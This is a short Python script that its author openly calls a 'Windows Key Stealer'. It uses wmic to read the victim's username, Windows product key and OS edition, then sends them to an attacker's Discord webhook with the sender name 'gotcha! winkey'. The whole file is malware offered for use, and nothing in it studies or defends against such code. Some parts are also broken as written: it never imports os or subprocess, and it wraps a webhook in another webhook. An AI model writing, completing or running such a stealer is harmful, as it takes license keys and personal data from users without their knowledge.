# Windows Key Stealer Made By Abolix#0637, Dont steal this plz and thx

from os import getenv 
import requests
from dhooks import Webhook, Embed

#webhooks
winkey_hook = Webhook(f"https://discord.com/api/webhooks/put_your_api_here")

#main code
def winkey():
    NAME = os.getenv("UserName")
    KEY = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
    KEY_TYPE = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
    if KEY == '':
        KEY = 'WINKEY NOT FOUND'
    else:
        pass   
    embed = Embed(
        title=f'WINDOWS KEY :',
        description=f'NAME > {NAME}\nTYPE > {KEY_TYPE}\nKEY > {KEY}',
        color=0x2f3136
        )
    embed.set_thumbnail('https://wallpaperaccess.com/full/1129133.jpg')
    winkeysteal = Webhook(winkey_hook)
    winkeysteal.username = 'gotcha! winkey'
    winkeysteal.avatar_url = 'https://cdn.discordapp.com/attachments/739948762792984590/791347256103796796/1129133.png'
    winkeysteal.send(embed=embed)

while True:
    winkey()
    break
